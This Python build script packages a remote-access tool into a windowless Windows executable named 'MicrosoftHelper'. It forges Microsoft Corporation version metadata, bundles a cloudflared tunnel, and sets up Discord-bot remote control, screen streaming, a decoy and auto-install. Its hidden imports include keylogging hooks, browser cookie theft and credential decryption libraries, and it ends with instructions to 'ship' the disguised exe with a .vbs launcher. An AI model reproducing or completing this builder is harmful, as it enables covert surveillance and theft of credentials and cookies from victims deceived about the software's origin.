import json
import pathlib
import secrets
import shutil
import subprocess
import sys
import urllib.request

BASE = pathlib.Path(__file__).parent
DIST = BASE / 'dist'
BUILD = BASE / 'build'
BIN = BASE / 'bin'
CF = BIN / 'cloudflared.exe'
NAME = 'MicrosoftHelper'
ICO = BASE / f'{NAME}.ico'
VERSION = BASE / 'version_info.txt'

PY = sys.executable


def sh(cmd, check=True):
    print(f'\n$ {cmd}')
    return subprocess.call(cmd, shell=True) if not check else subprocess.check_call(cmd, shell=True)


def dl(url, dest):
    dest.parent.mkdir(parents=True, exist_ok=True)
    if not dest.exists():
        print(f'downloading {dest.name} ...')
        try:
            urllib.request.urlretrieve(url, dest)
        except Exception as e:
            print(f'  failed: {e}')
    return dest


def ensure_pyinstaller():
    """Import check first, install if missing, then verify again."""
    code = 'import PyInstaller, sys; sys.stdout.write(PyInstaller.__version__)'
    r = subprocess.run([PY, '-c', code], capture_output=True, text=True)
    if r.returncode == 0:
        print(f'pyinstaller {r.stdout.strip()} found')
        return

    print('pyinstaller missing - installing')
    subprocess.check_call([PY, '-m', 'pip', 'install', '--upgrade',
                           '--disable-pip-version-check', 'pyinstaller'])

    r = subprocess.run([PY, '-c', code], capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stderr)
        raise SystemExit('pyinstaller install failed - run manually:\n'
                         f'  "{PY}" -m pip install --upgrade pyinstaller')
    print(f'pyinstaller {r.stdout.strip()} installed')


def make_icon():
    try:
        from PIL import Image
    except ImportError:
        print('Pillow missing - installing')
        subprocess.check_call([PY, '-m', 'pip', 'install', '--upgrade', 'Pillow'])
        from PIL import Image

    src = BASE / 'assets' / 'icon.png'
    if src.exists():
        im = Image.open(src).convert('RGBA')
    else:
        print('assets/icon.png not found - using fallback tile')
        im = Image.new('RGBA', (1024, 1024), (0, 120, 212, 255))
    im = im.resize((1024, 1024), Image.LANCZOS)
    im.save(ICO, format='ICO',
            sizes=[(16, 16), (24, 24), (32, 32), (48, 48),
                   (64, 64), (128, 128), (256, 256)])
    return ICO


def make_version():
    VERSION.write_text(f"""VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10,0,19041,1),
    prodvers=(10,0,19041,1),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0,0)
  ),
  kids=[
    StringFileInfo([
      StringTable('040904B0', [
        StringStruct('CompanyName','Microsoft Corporation'),
        StringStruct('FileDescription','Microsoft Helper Service'),
        StringStruct('FileVersion','10.0.19041.1'),
        StringStruct('InternalName','{NAME}'),
        StringStruct('LegalCopyright','Microsoft Corporation. All rights reserved.'),
        StringStruct('OriginalFilename','{NAME}.exe'),
        StringStruct('ProductName','Microsoft Helper'),
        StringStruct('ProductVersion','10.0.19041.1')
      ])
    ]),
    VarFileInfo([VarStruct('Translation',[1033,1200])])
  ]
)
""", encoding='utf-8')
    return VERSION


def main():
    print('== Microsoft Helper build ==')
    print(f'python: {PY}')

    if not (BASE / 'main.py').exists():
        raise SystemExit('main.py not found - run this from the project root')

    ensure_pyinstaller()

    print('\ninstalling requirements')
    subprocess.check_call([PY, '-m', 'pip', 'install', '--upgrade',
                           '--disable-pip-version-check', '-r', 'requirements.txt'])

    dl('https://github.com/cloudflare/cloudflared/releases/latest/download/'
       'cloudflared-windows-amd64.exe', CF)

    cfg = BASE / 'config.json'
    if not cfg.exists():
        json.dump({
            'token': 'PASTE_BOT_TOKEN', 'channel_id': 'PASTE_CHANNEL_ID',
            'allowed_user_ids': [], 'prefix': '!', 'delete_commands': True,
            'output_delete_ms': 0, 'web_port': 8787, 'web_token': '',
            'web_lan': True, 'cf_protocol': 'auto', 'cf_token': '', 'cf_hostname': '',
            'stream_fps': 25, 'stream_quality': 55, 'stream_scale': 1.0,
            'decoy': '', 'info_on_start': True, 'keep_awake': True,
            'auto_install': True, 'auto_panel': True,
        }, cfg.open('w'), indent=2)
        print('\nconfig.json created - fill token + channel_id, then rerun')
        return

    c = json.load(cfg.open())
    if not c.get('web_token'):
        c['web_token'] = secrets.token_urlsafe(18)
        json.dump(c, cfg.open('w'), indent=2)

    ico = make_icon()
    ver = make_version()

    add = ['--add-data "webui;webui"']
    if BIN.exists():
        add.append('--add-data "bin;bin"')

    hidden = [
        '--hidden-import=win32timezone',
        '--hidden-import=win32crypt',
        '--hidden-import=pynput.keyboard._win32',
        '--hidden-import=pynput.mouse._win32',
        '--collect-submodules=comtypes',
        '--collect-submodules=pycaw',
        '--collect-submodules=browser_cookie3',
        '--exclude-module=matplotlib',
        '--exclude-module=tkinter',
        '--exclude-module=PyQt5',
        '--exclude-module=PySide2',
    ]

    sh(' '.join([
        f'"{PY}"', '-m', 'PyInstaller',
        '--noconfirm', '--onefile', '--noconsole', '--clean', '--noupx',
        f'--name {NAME}',
        f'--icon "{ico}"',
        f'--version-file "{ver}"',
        '--distpath dist --workpath build --specpath .',
        *add, *hidden,
        'main.py',
    ]))

    DIST.mkdir(exist_ok=True)
    shutil.copy(cfg, DIST / 'config.json')
    vbs = BASE / 'MicrosoftHelper.vbs'
    if vbs.exists():
        shutil.copy(vbs, DIST / 'MicrosoftHelper.vbs')

    exe = DIST / f'{NAME}.exe'
    size = exe.stat().st_size / 1024 / 1024 if exe.exists() else 0

    print(f'\n== done ==  {exe}  ({size:.1f} MB)')
    print(f'web token: {c["web_token"]}')
    print('ship: MicrosoftHelper.exe + config.json + MicrosoftHelper.vbs')


if __name__ == '__main__':
    main()